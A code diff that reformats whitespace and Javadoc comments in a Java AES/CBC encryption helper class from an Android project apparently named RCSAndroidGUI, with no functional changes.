@@ -27,29 +27,31 @@ import com.ht.RCSAndroidGUI.utils.Check;
  * 
  */
 public class Crypto {
-	
+
 	/** The Constant TAG. */
 	private static final String TAG = "Crypto";
 
 	/** The aes_key. */
 	private final byte[] aes_key;
-	
+
 	/** The skey_spec. */
 	private final SecretKeySpec skey_spec;
-	
+
 	/** The iv spec. */
 	private final IvParameterSpec ivSpec;
-	
+
 	Cipher cipher;
 
 	/**
 	 * Instantiates a new crypto.
-	 *
-	 * @param key the key
-	 * @throws NoSuchPaddingException 
-	 * @throws NoSuchAlgorithmException 
+	 * 
+	 * @param key
+	 *            the key
+	 * @throws NoSuchPaddingException
+	 * @throws NoSuchAlgorithmException
 	 */
-	public Crypto(final byte[] key) throws NoSuchAlgorithmException, NoSuchPaddingException {
+	public Crypto(final byte[] key) throws NoSuchAlgorithmException,
+			NoSuchPaddingException {
 		aes_key = new byte[key.length];
 		System.arraycopy(key, 0, aes_key, 0, key.length);
 		skey_spec = new SecretKeySpec(aes_key, "AES");
@@ -61,19 +63,21 @@ public class Crypto {
 		}
 
 		ivSpec = new IvParameterSpec(iv);
-		
-		cipher= Cipher.getInstance("AES/CBC/NoPadding");
+
+		cipher = Cipher.getInstance("AES/CBC/NoPadding");
 	}
 
 	/**
 	 * Encrypt.
-	 *
-	 * @param clear the clear
+	 * 
+	 * @param clear
+	 *            the clear
 	 * @return the byte[]
-	 * @throws Exception the exception
+	 * @throws Exception
+	 *             the exception
 	 */
 	public byte[] encrypt(final byte[] clear) throws Exception {
-		
+
 		cipher.init(Cipher.ENCRYPT_MODE, skey_spec, ivSpec);
 		final byte[] encrypted = cipher.doFinal(clear);
 		return encrypted;
@@ -81,13 +85,15 @@ public class Crypto {
 
 	/**
 	 * Decrypt.
-	 *
-	 * @param encrypted the encrypted
+	 * 
+	 * @param encrypted
+	 *            the encrypted
 	 * @return the byte[]
-	 * @throws Exception the exception
+	 * @throws Exception
+	 *             the exception
 	 */
 	public byte[] decrypt(final byte[] encrypted) throws Exception {
-		//final Cipher cipher = Cipher.getInstance("AES/CBC/NoPadding");
+		// final Cipher cipher = Cipher.getInstance("AES/CBC/NoPadding");
 		cipher.init(Cipher.DECRYPT_MODE, skey_spec, ivSpec);
 		final byte[] decrypted = cipher.doFinal(encrypted);
 		return decrypted;
@@ -95,11 +101,14 @@ public class Crypto {
 
 	/**
 	 * Decrypt.
-	 *
-	 * @param encrypted the encrypted
-	 * @param offset the offset
+	 * 
+	 * @param encrypted
+	 *            the encrypted
+	 * @param offset
+	 *            the offset
 	 * @return the byte[]
-	 * @throws Exception the exception
+	 * @throws Exception
+	 *             the exception
 	 */
 	public byte[] decrypt(final byte[] encrypted, final int offset)
 			throws Exception {
@@ -107,7 +116,7 @@ public class Crypto {
 			return null;
 		}
 
-		//final Cipher cipher = Cipher.getInstance("AES/CBC/NoPadding");
+		// final Cipher cipher = Cipher.getInstance("AES/CBC/NoPadding");
 		cipher.init(Cipher.DECRYPT_MODE, skey_spec, ivSpec);
 
 		if (offset == 0) {
@@ -123,9 +132,11 @@ public class Crypto {
 	// COMPAT
 	/**
 	 * Decrypt.
-	 *
-	 * @param cypher the cypher
-	 * @param plain the plain
+	 * 
+	 * @param cypher
+	 *            the cypher
+	 * @param plain
+	 *            the plain
 	 */
 	public void decrypt(final byte[] cypher, final byte[] plain) {
 
